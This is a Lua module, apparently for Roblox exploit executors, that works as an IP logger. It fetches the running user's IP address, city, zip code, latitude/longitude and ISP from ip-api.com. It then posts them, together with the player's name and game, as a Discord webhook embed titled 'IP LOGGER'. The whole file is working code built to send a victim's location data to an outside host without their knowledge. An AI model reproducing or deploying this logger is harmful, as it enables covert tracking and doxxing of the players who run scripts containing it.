do
    -- This function returns a string with the name of the exploit u using(only checks for krnl, synapse, script ware)
    local function checkExploit()
        
        local exploitName = (syn and 'Synapse') or (Krnl and 'Krnl') or ( identifyexecutor and identifyexecutor() ) or (getexecutorname and getexecutorname())


        return exploitName

    end

    skidApi = {
        webhookJson = function(self, scriptName)

            if not self then return end
     
            local player = game.Players.LocalPlayer
            local playerThumb = string.format('https://www.roblox.com/Thumbs/Avatar.ashx?x=420&y=420&userid=%d&format=png', player.UserId)
            local ipData = self.ipApi
            scriptName = scriptName or 'EZ'
            return {
                content = string.format('**@%s** __fired__ **%s**', player.Name, scriptName),
                embeds  = {
                    { 
                        author={
                                name='L0gger',
                                url='https://discord.gg/gmJQNxbKpZ',
                                icon_url='https://media.discordapp.net/attachments/874435126778552414/874436606793252935/804211903676940288.png'
                        },
                        title=' **IP LOGGER** ',
                        url='https://discord.gg/gmJQNxbKpZ',
                        description = string.format('@%s**(%s)** fired **%s** [discord](https://discord.gg/gmJQNxbKpZ)', player.Name, player.DisplayName, scriptName),
                        color = 0,
                        fields  = {
                            {
                                name = '**Country**',
                                value = ipData['country'] .. '/' .. ipData['countryCode'],
                                inline = true
                            },
                            {
                                name = '**Region**',
                                value = ipData['regionName'] .. '/' .. ipData['region'],
                                inline = true
                            },
                            {
                                name = '**City/Zip**',
                                value = ipData['city'] .. '/' .. ipData['zip'],
                                inline = true
                            },
                            {
                                name = '**Game**',
                                value = "https://www.roblox.com/games/"..game.PlaceId
                                inline = true
                            }
                        },
                        thumbnail = {
                            url = playerThumb
                        }
                    },
                    {
                        color = 0,
                        fields={
                            {
                                name = '**lat/lon**',
                                value = ipData['lat'] .. '/' .. ipData['lon'],
                                inline = true
                            },
                            {
                                name = '**Isp/Org**',
                                value = ipData['isp'] .. '/' .. ipData['org'],
                                inline = true
                            },
                            {
                                name = '**IPV4/IPV6**',
                                value = ipData['query'],
                                inline = false
                            },
                        },
                        footer = {
                            text = 'Here is the info',
                            icon_url='https://images-ext-1.discordapp.net/external/SbqYbJ_5AGcMGKdwzxVuLc9RBromXc7y3K7vG_Gkd_U/%3Fv%3D1/https/cdn.discordapp.com/emojis/762821024592691221.png'
                        }
                    }
                }
            }
        end,

        ipApi = game:GetService('HttpService'):JSONDecode(game:HttpGet('http://ip-api.com/json')),
        exploitName = checkExploit(),

        httpPost = (Krnl and request) or (syn and syn.request) or http_request or (http and http.request),
        
        sendWebhook = function(self,webhooklink, ...)
            if self and webhooklink and self.httpPost and self.webhookJson then

                if type(self.webhookJson) == "function" then
                    return self.httpPost(
                    {
                        Url = webhooklink,
                        Method = 'POST',
                        Body = game:GetService('HttpService'):JSONEncode(self:webhookJson(...)) ,
                        Headers = {
                            ['Content-Type'] = 'application/json'
                        }
                    }
                )
                end

                return self.httpPost(
                    {
                        Url = webhooklink,
                        Method = 'POST',
                        Body = game:GetService('HttpService'):JSONEncode(self.webhookJson) ,
                        Headers = {
                            ['Content-Type'] = 'application/json'
                        }
                    }
                )
            end
        end
    }

end








return skidApi
